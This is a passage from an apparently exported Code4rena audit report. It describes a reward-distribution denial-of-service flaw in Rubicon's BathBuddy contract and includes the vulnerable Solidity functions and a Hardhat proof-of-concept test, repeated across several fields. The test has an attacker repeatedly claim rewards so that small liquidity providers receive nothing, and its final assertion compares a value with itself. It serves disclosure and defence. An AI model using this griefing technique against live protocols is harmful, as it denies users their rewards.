helper functions and proxy-wrapped contracts generally\ndescribe(\"RubiconV2 rewards system\", function () {\n  const CERC20_ABI = [\n    \"function name() external view returns(string memory)\",\n    \"function symbol() external view returns(string memory)\",\n    \"function decimals() external view returns(uint8)\",\n    \"function balanceOf(address) external view returns(uint256)\",\n    \"function admin() external view returns(address)\",\n    \"function mint(uint256) external returns(uint256)\",\n  ];\n  const BUDDY_ABI = [\n    \"function setRewardsDuration(uint256,address) external\",\n    \"function notifyRewardAmount(uint256,address) external\",\n    \"function earned(address,address) external view returns(uint256)\",\n  ];\n\n  async function buddySetupFixture() {\n    // Contracts are deployed using the first signer/account by default\n    const [owner, alice, eve] = await ethers.getSigners();\n\n    // Use Compound Fork to spawn some cTokens...\n    // Note: In prod COMP uses Unitroller for Comptroller storage and upgradeability*\n    const ComptrollerFactory = await ethers.getContractFactory(\"Comptroller\");\n    const comptroller = await ComptrollerFactory.deploy(); // TODO: Rename to bath house?\n\n    const BathHouse = await ethers.getContractFactory(\"BathHouseV2\");\n    const bathHouse = await BathHouse.deploy();\n\n    await bathHouse.initialize(comptroller.address, owner.address);\n\n    // Deploy Test ERC20 to use throughout testing\n    const testCoinFactory = await ethers.getContractFactory(\"TokenWithFaucet\");\n    const testCoin = await testCoinFactory.deploy(\n      owner.address,\n      \"Test\",\n      \"TEST\",\n      18\n    );\n    const testStableCoin = await testCoinFactory.deploy(\n      owner.address,\n      \"Test Stablecoin\",\n      \"TUSDC\",\n      6\n    );\n\n    const testRewardCoin = await testCoinFactory\n      .connect(owner)\n      .deploy(\n        owner.address,\n        \"SuperHyperCoolTokenThatRewardsLiquidityProvidersWithHugeReturns\",\n        \"BTC\",\n        18\n      );\n\n    const interestRateModelFactory = await ethers.getContractFactory(\n      \"WhitePaperInterestRateModel\"\n    );\n\n    // Inputs\n    const baseRatePerYear = parseUnits(\"0.3\"); //  TODO: WHAT SHOULD THIS BE?\n    const multiplierPerYear = parseUnits(\"0.02\"); //  TODO: WHAT SHOULD THIS BE?\n    const irModel = await interestRateModelFactory.deploy(\n      baseRatePerYear,\n      multiplierPerYear\n    );\n\n    const cTokenFactory = await ethers.getContractFactory(\"CErc20Delegate\");\n    const cTokenImplementation = await cTokenFactory.deploy();\n\n    // Initialize the market\n    const underlying = testCoin.address;\n    const interestRateModel = irModel.address;\n    const initialExchangeRateMantissa = \"200000000000000000000000000\"; // TODO: What should this be?\n\n    const becomeImplementationData = \"0x\"; //TODO: What should this be?\n\n    await bathHouse.createBathToken(\n      underlying,\n      interestRateModel,\n      initialExchangeRateMantissa,\n      cTokenImplementation.address,\n      becomeImplementationData\n    );\n    const bathTokenAddress = await bathHouse.getBathTokenFromAsset(underlying);\n    const bathTEST = new ethers.Contract(bathTokenAddress, CERC20_ABI, owner);\n\n    const buddyAddress = await bathHouse.whoIsBuddy(bathTokenAddress);\n    const buddy = new ethers.Contract(buddyAddress, BUDDY_ABI, owner);\n\n    // Setup cToken in System correctly:\n    await comptroller._supportMarket(bathTEST!.address).catch((e: any) => {\n      console.log(\"\\nError supporting new cToken market!\", e.reason, \"\\n\");\n    });\n\n    await testCoin.connect(alice).faucet();\n    await testStableCoin.connect(alice).faucet();\n    await testCoin.connect(eve).faucet();\n    await testStableCoin.connect(eve).faucet();\n\n    await buddy.setRewardsDuration(\n      365 * 24 * 60 * 60,\n      testStableCoin.address\n    );\n    await testStableCoin.transfer(buddy.address, parseUnits(\"10000\", 6));\n    await buddy.notifyRewardAmount(\n      parseUnits(\"10000\", 6),\n      testStableCoin.address\n    );\n\n    await comptroller.setCompAddress(testRewardCoin.address);\n    await comptroller._setCompSpeeds(\n      [bathTEST.address],\n      [parseUnits(\"2.28\")],\n      [parseUnits(\"0.322\")]\n    );\n\n    const PriceOracleFactory = await ethers.getContractFactory(\n      \"DummyPriceOracle\"\n    );\n    const priceOracle = await PriceOracleFactory.deploy();\n\n    // price of TEST = $0.9\n    await priceOracle.addCtoken(bathTEST.address, parseUnits(\"0.9\", 18));\n\n    await comptroller._setPriceOracle(priceOracle.address);\n\n    await comptroller._setCollateralFactor(bathTEST.address, parseUnits(\"0.7\"));\n\n    const rewardBalance = await testRewardCoin.balanceOf(owner.address);\n    await testRewardCoin.transfer(comptroller.address, rewardBalance);\n\n    await testCoin.connect(alice).approve(bathTEST.address, parseUnits(\"10\"));\n    await bathTEST.connect(alice).mint(parseUnits(\"10\"));\n    await testCoin.connect(eve).approve(bathTEST.address, parseUnits(\"10000\"));\n    await bathTEST.connect(eve).mint(parseUnits(\"10000\"));\n\n    return {\n      comptroller,\n      testCoin,\n      bathTEST,\n      alice,\n      eve,\n      testStableCoin,\n      testRewardCoin,\n      buddy,\n      bathHouse,\n    };\n  }\n\n  describe(\"Testing the rewards\", async function () {\n    it(\"POC1\", async function () {\n      const {\n        alice, \n        eve,\n        testStableCoin,\n        buddy,\n        bathHouse,\n      } = await loadFixture(buddySetupFixture);\n\n      // Eve calls claimRewards to reset lastUpdateTime (claimRewards internaly calls BathBuddy's getReward)\n      await bathHouse.connect(eve).claimRewards([buddy.address], [testStableCoin.address])\n      // Alice tries to claim her rewards\n      await bathHouse.connect(alice).claimRewards([buddy.address], [testStableCoin.address])\n      const earned1 = await testStableCoin.balanceOf(alice.address);\n\n      // Eve calls claimRewards to reset lastUpdateTime\n      await bathHouse.connect(eve).claimRewards([buddy.address], [testStableCoin.address])\n      // Alice tries to claim her rewards\n      await bathHouse.connect(alice).claimRewards([buddy.address], [testStableCoin.address])\n      const earned2 = await testStableCoin.balanceOf(alice.address);\n      // Check that Alice didn't get any rewards\n      expect(earned2.toBigInt() - earned1.toBigInt()).to.be.equal(0);\n\n      // Eve calls claimRewards to reset lastUpdateTime\n      await bathHouse.connect(eve).claimRewards([buddy.address], [testStableCoin.address])\n      // Alice tries to claim her rewards\n      await bathHouse.connect(alice).claimRewards([buddy.address], [testStableCoin.address])\n      const earned3 = await testStableCoin.balanceOf(alice.address);\n      // Check that Alice didn't get any rewards\n      expect(earned3.toBigInt() - earned2.toBigInt()).to.be.equal(0);\n\n      // Eve calls claimRewards to reset lastUpdateTime\n      await bathHouse.connect(eve).claimRewards([buddy.address], [testStableCoin.address])\n      await bathHouse.connect(alice).claimRewards([buddy.address], [testStableCoin.address])\n      const earned4 = await testStableCoin.balanceOf(alice.address);\n      // Check that Alice didn't get any rewards\n      expect(earned4.toBigInt() - earned4.toBigInt()).to.be.equal(0);\n    });\n  });\n});\n```\n\n## Tools Used\nManual Review",
      "description": null,
      "impact": "## Impact\n\nAs described in the docs, Rubicon protocol allows users to act as as liquidity providers (LPs), by providing funds and receiving `bathToken` in return, which can be used to obtain rewards through `BathBuddy` contract.  But `BathBuddy` internal logic allows any user to DoS reward distribution to smalls LPs by constantly calling `getReward` at small intervals. This is specially effective against small LPs. This finding should be classified as having medium severity, even though no funds are at risk,  the attacker can affect the protocol's functionality for an indefinite period of time.\n",
      "mitigation": null,
      "poc": "## Proof of Concept\n\n`BathBuddy`'s user rewards are calculated as shown below.\n\n```solidity\nfunction earned(\n        address account,\n        address token\n    ) public view override returns (uint256) {\n        require(friendshipStarted, \"I have not started a bathToken friendship\");\n\n        return\n            IERC20(myBathTokenBuddy) // Care with this?\n                .balanceOf(account)\n                .mul(\n                    rewardPerToken(token).sub(\n                        userRewardsPerTokenPaid[token][account]\n                    )\n                )\n                .div(1e18)\n                .add(tokenRewards[token][account]);\n    }\n```\n\nWhere `rewardPerToken`  values are updated by calling the `rewardPerToken` function.\n\n```solidity\nfunction rewardPerToken(address token) public view returns (uint256) {\n        require(friendshipStarted, \"I have not started a bathToken friendship\");\n\n        if (IERC20(myBathTokenBuddy).totalSupply() == 0) {\n            return rewardsPerTokensStored[token];\n        }\n        return\n            rewardsPerTokensStored[token].add(\n                lastTimeRewardApplicable(token)\n                    .sub(lastUpdateTime[token])\n                    .mul(rewardRates[token])\n                    .mul(1e18)\n                    .div(IERC20(myBathTokenBuddy).totalSupply())\n            );\n    }\n```\n\nAs we can see in the code snippet above, if the interval between calls to `rewardPerToken` are small, the resulting `rewardsPerToken` updates will also be small. Therefore there is the possibility of the user earned values rounding down to zero, especially if the user's  `bathToken` balance are small compared to `bathToken` `totalSupply()`.\n\nThis enables a malicious actor to block reward distribution to smalls LPs by constantly calling  `getReward`, to keep refreshing the global `lastUpdateTime`, for example at every new block (2s  on Optimism).  As gas fees are low in L2 networks, the malicious actor can DoS at little cost, while affecting many small LPs .\n\nThe following test reproduce the above scenario, demonstrating that reward distribution to users with small bathToken balances can be completely and indefinitely blocked by repeatedly calling `getReward`.\n\n```typescript\nimport { time, loadFixture } from \"@nomicfoundation/hardhat-network-helpers\";\nimport { anyValue } from \"@nomicfoundation/hardhat-chai-matchers/withArgs\";\nimport { expect } from \"chai\";\nimport { ethers, network } from \"hardhat\";\nimport { formatUnits, parseUnits } from \"ethers/lib/utils\";\n\n// TODO: Implement Proxy-wrapping helper functions and proxy-wrapped contracts generally\ndescribe(\"RubiconV2 rewards system\", function () {\n  const CERC20_ABI = [\n    \"function name() external view returns(string memory)\",\n    \"function symbol() external view returns(string memory)\",\n    \"function decimals() external view returns(uint8)\",\n    \"function balanceOf(address) external view returns(uint256)\",\n    \"function admin() external view returns(address)\",\n    \"function mint(uint256) external returns(uint256)\",\n  ];\n  const BUDDY_ABI = [\n    \"function setRewardsDuration(uint256,address) external\",\n    \"function notifyRewardAmount(uint256,address) external\",\n    \"function earned(address,address) external view returns(uint256)\",\n  ];\n\n  async function buddySetupFixture() {\n    // Contracts are deployed using the first signer/account by default\n    const [owner, alice, eve] = await ethers.getSigners();\n\n    // Use Compound Fork to spawn some cTokens...\n    // Note: In prod COMP uses Unitroller for Comptroller storage and upgradeability*\n    const ComptrollerFactory = await ethers.getContractFactory(\"Comptroller\");\n    const comptroller = await ComptrollerFactory.deploy(); // TODO: Rename to bath house?\n\n    const BathHouse = await ethers.getContractFactory(\"BathHouseV2\");\n    const bathHouse = await BathHouse.deploy();\n\n    await bathHouse.initialize(comptroller.address, owner.address);\n\n    // Deploy Test ERC20 to use throughout testing\n    const testCoinFactory = await ethers.getContractFactory(\"TokenWithFaucet\");\n    const testCoin = await testCoinFactory.deploy(\n      owner.address,\n      \"Test\",\n      \"TEST\",\n      18\n    );\n    const testStableCoin = await testCoinFactory.deploy(\n      owner.address,\n      \"Test Stablecoin\",\n      \"TUSDC\",\n      6\n    );\n\n    const testRewardCoin = await testCoinFactory\n      .connect(owner)\n      .deploy(\n        owner.address,\n        \"SuperHyperCoolTokenThatRewardsLiquidityProvidersWithHugeReturns\",\n        \"BTC\",\n        18\n      );\n\n    const interestRateModelFactory = await ethers.getContractFactory(\n      \"WhitePaperInterestRateModel\"\n    );\n\n    // Inputs\n    const baseRatePerYear = parseUnits(\"0.3\"); //  TODO: WHAT SHOULD THIS BE?\n    const multiplierPerYear = parseUnits(\"0.02\"); //  TODO: WHAT SHOULD THIS BE?\n    const irModel = await interestRateModelFactory.deploy(\n      baseRatePerYear,\n      multiplierPerYear\n    );\n\n    const cTokenFactory = await ethers.getContractFactory(\"CErc20Delegate\");\n    const cTokenImplementation = await cTokenFactory.deploy();\n\n    // Initialize the market\n    const underlying = testCoin.address;\n    const interestRateModel = irModel.address;\n    const initialExchangeRateMantissa = \"200000000000000000000000000\"; // TODO: What should this be?\n\n    const becomeImplementationData = \"0x\"; //TODO: What should this be?\n\n    await bathHouse.createBathToken(\n      underlying,\n      interestRateModel,\n      initialExchangeRateMantissa,\n      cTokenImplementation.address,\n      becomeImplementationData\n    );\n    const bathTokenAddress = await bathHouse.getBathTokenFromAsset(underlying);\n    const bathTEST = new ethers.Contract(bathTokenAddress, CERC20_ABI, owner);\n\n    const buddyAddress = await bathHouse.whoIsBuddy(bathTokenAddress);\n    const buddy = new ethers.Contract(buddyAddress, BUDDY_ABI, owner);\n\n    // Setup cToken in System correctly:\n    await comptroller._supportMarket(bathTEST!.address).catch((e: any) => {\n      console.log(\"\\nError supporting new cToken market!\", e.reason, \"\\n\");\n    });\n\n    await testCoin.connect(alice).faucet();\n    await testStableCoin.connect(alice).faucet();\n    await testCoin.connect(eve).faucet();\n    await testStableCoin.connect(eve).faucet();\n\n    await buddy.setRewardsDuration(\n      365 * 24 * 60 * 60,\n      testStableCoin.address\n    );\n    await testStableCoin.transfer(buddy.address, parseUnits(\"10000\", 6));\n    await buddy.notifyRewardAmount(\n      parseUnits(\"10000\", 6),\n      testStableCoin.address\n    );\n\n    await comptroller.setCompAddress(testRewardCoin.address);\n    await comptroller._setCompSpeeds(\n      [bathTEST.address],\n      [parseUnits(\"2.28\")],\n      [parseUnits(\"0.322\")]\n    );\n\n    const PriceOracleFactory = await ethers.getContractFactory(\n      \"DummyPriceOracle\"\n    );\n    const priceOracle = await PriceOracleFactory.deploy();\n\n    // price of TEST = $0.9\n    await priceOracle.addCtoken(bathTEST.address, parseUnits(\"0.9\", 18));\n\n    await comptroller._setPriceOracle(priceOracle.address);\n\n    await comptroller._setCollateralFactor(bathTEST.address, parseUnits(\"0.7\"));\n\n    const rewardBalance = await testRewardCoin.balanceOf(owner.address);\n    await testRewardCoin.transfer(comptroller.address, rewardBalance);\n\n    await testCoin.connect(alice).approve(bathTEST.address, parseUnits(\"10\"));\n    await bathTEST.connect(alice).mint(parseUnits(\"10\"));\n    await testCoin.connect(eve).approve(bathTEST.address, parseUnits(\"10000\"));\n    await bathTEST.connect(eve).mint(parseUnits(\"10000\"));\n\n    return {\n      comptroller,\n      testCoin,\n      bathTEST,\n      alice,\n      eve,\n      testStableCoin,\n      testRewardCoin,\n      buddy,\n      bathHouse,\n    };\n  }\n\n  describe(\"Testing the rewards\", async function () {\n    it(\"POC1\", async function () {\n      const {\n        alice,\n        eve,\n        testStableCoin,\n        buddy,\n        bathHouse,\n      } = await loadFixture(buddySetupFixture);\n\n      // Eve calls claimRewards to reset lastUpdateTime (claimRewards internaly calls BathBuddy's getReward)\n      await bathHouse.connect(eve).claimRewards([buddy.address], [testStableCoin.address])\n      // Alice tries to claim her rewards\n      await bathHouse.connect(alice).claimRewards([buddy.address], [testStableCoin.address])\n      const earned1 = await testStableCoin.balanceOf(alice.address);\n\n      // Eve calls claimRewards to reset lastUpdateTime\n      await bathHouse.connect(eve).claimRewards([buddy.address], [testStableCoin.address])\n      // Alice tries to claim her rewards\n      await bathHouse.connect(alice).claimRewards([buddy.address], [testStableCoin.address])\n      const earned2 = await testStableCoin.balanceOf(alice.address);\n      // Check that Alice didn't get any rewards\n      expect(earned2.toBigInt() - earned1.toBigInt()).to.be.equal(0);\n\n      // Eve calls claimRewards to reset lastUpdateTime\n      await bathHouse.connect(eve).claimRewards([buddy.address], [testStableCoin.address])\n      // Alice tries to claim her rewards\n      await bathHouse.connect(alice).claimRewards([buddy.address], [testStableCoin.address])\n      const earned3 = await testStableCoin.balanceOf(alice.address);\n      // Check that Alice didn't get any rewards\n      expect(earned3.toBigInt() - earned2.toBigInt()).to.be.equal(0);\n\n      // Eve calls claimRewards to reset lastUpdateTime\n      await bathHouse.connect(eve).claimRewards([buddy.address], [testStableCoin.address])\n      await bathHouse.connect(alice).claimRewards([buddy.address], [testStableCoin.address])\n      const earned4 = await testStableCoin.balanceOf(alice.address);\n      // Check that Alice didn't get any rewards\n      expect(earned4.toBigInt() - earned4.toBigInt()).to.be.equal(0);\n    });\n  });\n});\n```\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/periphery/BathBuddy.sol#L121-L135\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/periphery/BathBuddy.sol#L139-L155\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual Review\n",
      "sections": {
        "description": null,
        "impact": "## Impact\n\nAs described in the docs, Rubicon protocol allows users to act as as liquidity providers (LPs), by providing funds and receiving `bathToken` in return, which can be used to obtain rewards through `BathBuddy` contract.  But `BathBuddy` internal logic allows any user to DoS reward distribution to smalls LPs by constantly calling `getReward` at small intervals. This is specially effective against small LPs. This finding should be classified as having medium severity, even though no funds are at risk,  the attacker can affect the protocol's functionality for an indefinite period of time.\n",
        "recommendation": null,
        "poc": "## Proof of Concept\n\n`BathBuddy`'s user rewards are calculated as shown below.\n\n```solidity\nfunction earned(\n        address account,\n        address token\n    ) public view override returns (uint256) {\n        require(friendshipStarted, \"I have not started a bathToken friendship\");\n\n        return\n            IERC20(myBathTokenBuddy) // Care with this?\n                .balanceOf(account)\n                .mul(\n                    rewardPerToken(token).sub(\n                        userRewardsPerTokenPaid[token][account]\n                    )\n                )\n                .div(1e18)\n                .add(tokenRewards[token][account]);\n    }\n```\n\nWhere `rewardPerToken`  values are updated by calling the `rewardPerToken` function.\n\n```solidity\nfunction rewardPerToken(address token) public view returns (uint256) {\n        require(friendshipStarted, \"I have not started a bathToken friendship\");\n\n        if (IERC20(myBathTokenBuddy).totalSupply() == 0) {\n            return rewardsPerTokensStored[token];\n        }\n        return\n            rewardsPerTokensStored[token].add(\n                lastTimeRewardApplicable(token)\n                    .sub(lastUpdateTime[token])\n                    .mul(rewardRates[token])\n                    .mul(1e18)\n                    .div(IERC20(myBathTokenBuddy).totalSupply())\n            );\n    }\n```\n\nAs we can see in the code snippet above, if the interval between calls to `rewardPerToken` are small, the resulting `rewardsPerToken` updates will also be small. Therefore there is the possibility of the user earned values rounding down to zero, especially if the user's  `bathToken` balance are small compared to `bathToken` `totalSupply()`.\n\nThis enables a malicious actor to block reward distribution to smalls LPs by constantly calling  `getReward`, to keep refreshing the global `lastUpdateTime`, for example at every new block (2s  on Optimism).  As gas fees are low in L2 networks, the malicious actor can DoS at little cost, while affecting many small LPs .\n\nThe following test reproduce the above scenario, demonstrating that reward distribution to users with small bathToken balances can be completely and indefinitely blocked by repeatedly calling `getReward`.\n\n```typescript\nimport { time, loadFixture } from \"@nomicfoundation/hardhat-network-helpers\";\nimport { anyValue } from \"@nomicfoundation/hardhat-chai-matchers/withArgs\";\nimport { expect } from \"chai\";\nimport { ethers, network } from \"hardhat\";\nimport { formatUnits, parseUnits } from \"ethers/lib/utils\";\n\n// TODO: Implement Proxy-wrapping helper functions and proxy-wrapped contracts generally\ndescribe(\"RubiconV2 rewards system\", function () {\n  const CERC20_ABI = [\n    \"function name() external view returns(string memory)\",\n    \"function symbol() external view returns(string memory)\",\n    \"function decimals() external view returns(uint8)\",\n    \"function balanceOf(address) external view returns(uint256)\",\n    \"function admin() external view returns(address)\",\n    \"function mint(uint256) external returns(uint256)\",\n  ];\n  const BUDDY_ABI = [\n    \"function setRewardsDuration(uint256,address) external\",\n    \"function notifyRewardAmount(uint256,address) external\",\n    \"function earned(address,address) external view returns(uint256)\",\n  ];\n\n  async function buddySetupFixture() {\n    // Contracts are deployed using the first signer/account by default\n    const [owner, alice, eve] = await ethers.getSigners();\n\n    // Use Compound Fork to spawn some cTokens...\n    // Note: In prod COMP uses Unitroller for Comptroller storage and upgradeability*\n    const ComptrollerFactory = await ethers.getContractFactory(\"Comptroller\");\n    const comptroller = await ComptrollerFactory.deploy(); // TODO: Rename to bath house?\n\n    const BathHouse = await ethers.getContractFactory(\"BathHouseV2\");\n    const bathHouse = await BathHouse.deploy();\n\n    await bathHouse.initialize(comptroller.address, owner.address);\n\n    // Deploy Test ERC20 to use throughout testing\n    const testCoinFactory = await ethers.getContractFactory(\"TokenWithFaucet\");\n    const testCoin = await testCoinFactory.deploy(\n      owner.address,\n      \"Test\",\n      \"TEST\",\n      18\n    );\n    const testStableCoin = await testCoinFactory.deploy(\n      owner.address,\n      \"Test Stablecoin\",\n      \"TUSDC\",\n      6\n    );\n\n    const testRewardCoin = await testCoinFactory\n      .connect(owner)\n      .deploy(\n        owner.address,\n        \"SuperHyperCoolTokenThatRewardsLiquidityProvidersWithHugeReturns\",\n        \"BTC\",\n        18\n      );\n\n    const interestRateModelFactory = await ethers.getContractFactory(\n      \"WhitePaperInterestRateModel\"\n    );\n\n    // Inputs\n    const baseRatePerYear = parseUnits(\"0.3\"); //  TODO: WHAT SHOULD THIS BE?\n    const multiplierPerYear = parseUnits(\"0.02\"); //  TODO: WHAT SHOULD THIS BE?\n    const irModel = await interestRateModelFactory.deploy(\n      baseRatePerYear,\n      multiplierPerYear\n    );\n\n    const cTokenFactory = await ethers.getContractFactory(\"CErc20Delegate\");\n    const cTokenImplementation = await cTokenFactory.deploy();\n\n    // Initialize the market\n    const underlying = testCoin.address;\n    const interestRateModel = irModel.address;\n    const initialExchangeRateMantissa = \"200000000000000000000000000\"; // TODO: What should this be?\n\n    const becomeImplementationData = \"0x\"; //TODO: What should this be?\n\n    await bathHouse.createBathToken(\n      underlying,\n      interestRateModel,\n      initialExchangeRateMantissa,\n      cTokenImplementation.address,\n      becomeImplementationData\n    );\n    const bathTokenAddress = await bathHouse.getBathTokenFromAsset(underlying);\n    const bathTEST = new ethers.Contract(bathTokenAddress, CERC20_ABI, owner);\n\n    const buddyAddress = await bathHouse.whoIsBuddy(bathTokenAddress);\n    const buddy = new ethers.Contract(buddyAddress, BUDDY_ABI, owner);\n\n    // Setup cToken in System correctly:\n    await comptroller._supportMarket(bathTEST!.address).catch((e: any) => {\n      console.log(\"\\nError supporting new cToken market!\", e.reason, \"\\n\");\n    });\n\n    await testCoin.connect(alice).faucet();\n    await testStableCoin.connect(alice).faucet();\n    await testCoin.connect(eve).faucet();\n    await testStableCoin.connect(eve).faucet();\n\n    await buddy.setRewardsDuration(\n      365 * 24 * 60 * 60,\n      testStableCoin.address\n    );\n    await testStableCoin.transfer(buddy.address, parseUnits(\"10000\", 6));\n    await buddy.notifyRewardAmount(\n      parseUnits(\"10000\", 6),\n      testStableCoin.address\n    );\n\n    await comptroller.setCompAddress(testRewardCoin.address);\n    await comptroller._setCompSpeeds(\n      [bathTEST.address],\n      [parseUnits(\"2.28\")],\n      [parseUnits(\"0.322\")]\n    );\n\n    const PriceOracleFactory = await ethers.getContractFactory(\n      \"DummyPriceOracle\"\n    );\n    const priceOracle = await PriceOracleFactory.deploy();\n\n    // price of TEST = $0.9\n    await priceOracle.addCtoken(bathTEST.address, parseUnits(\"0.9\", 18));\n\n    await comptroller._setPriceOracle(priceOracle.address);\n\n    await comptroller._setCollateralFactor(bathTEST.address, parseUnits(\"0.7\"));\n\n    const rewardBalance = await testRewardCoin.balanceOf(owner.address);\n    await testRewardCoin.transfer(comptroller.address, rewardBalance);\n\n    await testCoin.connect(alice).approve(bathTEST.address, parseUnits(\"10\"));\n    await bathTEST.connect(alice).mint(parseUnits(\"10\"));\n    await testCoin.connect(eve).approve(bathTEST.address, parseUnits(\"10000\"));\n    await bathTEST.connect(eve).mint(parseUnits(\"10000\"));\n\n    return {\n      comptroller,\n      testCoin,\n      bathTEST,\n      alice,\n      eve,\n      testStableCoin,\n      testRewardCoin,\n      buddy,\n      bathHouse,\n    };\n  }\n\n  describe(\"Testing the rewards\", async function () {\n    it(\"POC1\", async function () {\n      const {\n        alice,\n        eve,\n        testStableCoin,\n        buddy,\n        bathHouse,\n      } = await loadFixture(buddySetupFixture);\n\n      // Eve calls claimRewards to reset lastUpdateTime (claimRewards internaly calls BathBuddy's getReward)\n      await bathHouse.connect(eve).claimRewards([buddy.address], [testStableCoin.address])\n      // Alice tries to claim her rewards\n      await bathHouse.connect(alice).claimRewards([buddy.address], [testStableCoin.address])\n      const earned1 = await testStableCoin.balanceOf(alice.address);\n\n      // Eve calls claimRewards to reset lastUpdateTime\n      await bathHouse.connect(eve).claimRewards([buddy.address], [testStableCoin.address])\n      // Alice tries to claim her rewards\n      await bathHouse.connect(alice).claimRewards([buddy.address], [testStableCoin.address])\n      const earned2 = await testStableCoin.balanceOf(alice.address);\n      // Check that Alice didn't get any rewards\n      expect(earned2.toBigInt() - earned1.toBigInt()).to.be.equal(0);\n\n      // Eve calls claimRewards to reset lastUpdateTime\n      await bathHouse.connect(eve).claimRewards([buddy.address], [testStableCoin.address])\n      // Alice tries to claim her rewards\n      await bathHouse.connect(alice).claimRewards([buddy.address], [testStableCoin.address])\n      const earned3 = await testStableCoin.balanceOf(alice.address);\n      // Check that Alice didn't get any rewards\n      expect(earned3.toBigInt() - earned2.toBigInt()).to.be.equal(0);\n\n      // Eve calls claimRewards to reset lastUpdateTime\n      await bathHouse.connect(eve).claimRewards([buddy.address], [testStableCoin.address])\n      await bathHouse.connect(alice).claimRewards([buddy.address], [testStableCoin.address])\n      const earned4 = await testStableCoin.balanceOf(alice.address);\n      // Check that Alice didn't get any rewards\n      expect(earned4.toBigInt() - earned4.toBigInt()).to.be.equal(0);\n    });\n  });\n});\n```\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/periphery/BathBuddy.sol#L121-L135\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/periphery/BathBuddy.sol#L139-L155\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual Review\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/periphery/BathBuddy.sol#L121-L135\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/periphery/BathBuddy.sol#L139-L155\n\n\n# Vulnerability details\n\n## Impact\n\nAs described in the docs, Rubicon protocol allows users to act as as liquidity providers (LPs), by providing funds and receiving `bathToken` in return, which can be used to obtain rewards through `BathBuddy` contract.  But `BathBuddy` internal logic allows any user to DoS reward distribution to smalls LPs by constantly calling `getReward` at small intervals. This is specially effective against small LPs. This finding should be classified as having medium severity, even though no funds are at risk,  the attacker can affect the protocol's functionality for an indefinite period of time.\n\n## Proof of Concept\n\n`BathBuddy`'s user rewards are calculated as shown below.\n\n```solidity\nfunction earned(\n        address account,\n        address token\n    ) public view override returns (uint256) {\n        require(friendshipStarted, \"I have not started a bathToken friendship\");\n\n        return\n            IERC20(myBathTokenBuddy) // Care with this?\n                .balanceOf(account)\n                .mul(\n                    rewardPerToken(token).sub(\n                        userRewardsPerTokenPaid[token][account]\n                    )\n                )\n                .div(1e18)\n                .add(tokenRewards[token][account]);\n    }\n```\n\nWhere `rewardPerToken`  values are updated by calling the `rewardPerToken` function.\n\n```solidity\nfunction rewardPerToken(address token) public view returns (uint256) {\n        require(friendshipStarted, \"I have not started a bathToken friendship\");\n\n        if (IERC20(myBathTokenBuddy).totalSupply() == 0) {\n            return rewardsPerTokensStored[token];\n        }\n        return\n            rewardsPerTokensStored[token].add(\n                lastTimeRewardApplicable(token)\n                    .sub(lastUpdateTime[token])\n                    .mul(rewardRates[token])\n                    .mul(1e18)\n                    .div(IERC20(myBathTokenBuddy).totalSupply())\n            );\n    }\n```\n\nAs we can see in the code snippet above, if the interval between calls to `rewardPerToken` are small, the resulting `rewardsPerToken` updates will also be small. Therefore there is the possibility of the user earned values rounding down to zero, especially if the user's  `bathToken` balance are small compared to `bathToken` `totalSupply()`.\n\nThis enables a malicious actor to block reward distribution to smalls LPs by constantly calling  `getReward`, to keep refreshing the global `lastUpdateTime`, for example at every new block (2s  on Optimism).  As gas fees are low in L2 networks, the malicious actor can DoS at little cost, while affecting many small LPs .\n\nThe following test reproduce the above scenario, demonstrating that reward distribution to users with small bathToken balances can be completely and indefinitely blocked by repeatedly calling `getReward`.\n\n```typescript\nimport { time, loadFixture } from \"@nomicfoundation/hardhat-network-helpers\";\nimport { anyValue } from \"@nomicfoundation/hardhat-chai-matchers/withArgs\";\nimport { expect } from \"chai\";\nimport { ethers, network } from \"hardhat\";\nimport { formatUnits, parseUnits } from \"ethers/lib/utils\";\n\n// TODO: Implement Proxy-wrapping helper functions and proxy-wrapped contracts generally\ndescribe(\"RubiconV2 rewards system\", function () {\n  const CERC20_ABI = [\n    \"function name() external view returns(string memory)\",\n    \"function symbol() external view returns(string memory)\",\n    \"function decimals() external view returns(uint8)\",\n    \"function balanceOf(address) external view returns(uint256)\",\n    \"function admin() external view returns(address)\",\n    \"function mint(uint256) external returns(uint256)\",\n  ];\n  const BUDDY_ABI = [\n    \"function setRewardsDuration(uint256,address) external\",\n    \"function notifyRewardAmount(uint256,address) external\",\n    \"function earned(address,address) external view returns(uint256)\",\n  ];\n\n  async function buddySetupFixture() {\n    // Contracts are deployed using the first signer/account by default\n    const [owner, alice, eve] = await ethers.getSigners();\n\n    // Use Compound Fork to spawn some cTokens...\n    // Note: In prod COMP uses Unitroller for Comptroller storage and upgradeability*\n    const ComptrollerFactory = await ethers.getContractFactory(\"Comptroller\");\n    const comptroller = await ComptrollerFactory.deploy(); // TODO: Rename to bath house?\n\n    const BathHouse = await ethers.getContractFactory(\"BathHouseV2\");\n    const bathHouse = await BathHouse.deploy();\n\n    await bathHouse.initialize(comptroller.address, owner.address);\n\n    // Deploy Test ERC20 to use throughout testing\n    const testCoinFactory = await ethers.getContractFactory(\"TokenWithFaucet\");\n    const testCoin = await testCoinFactory.deploy(\n      owner.address,\n      \"Test\",\n      \"TEST\",\n      18\n    );\n    const testStableCoin = await testCoinFactory.deploy(\n      owner.address,\n      \"Test Stablecoin\",\n      \"TUSDC\",\n      6\n    );\n\n    const testRewardCoin = await testCoinFactory\n      .connect(owner)\n      .deploy(\n        owner.address,\n        \"SuperHyperCoolTokenThatRewardsLiquidityProvidersWithHugeReturns\",\n        \"BTC\",\n        18\n      );\n\n    const interestRateModelFactory = await ethers.getContractFactory(\n      \"WhitePaperInterestRateModel\"\n    );\n\n    // Inputs\n    const baseRatePerYear = 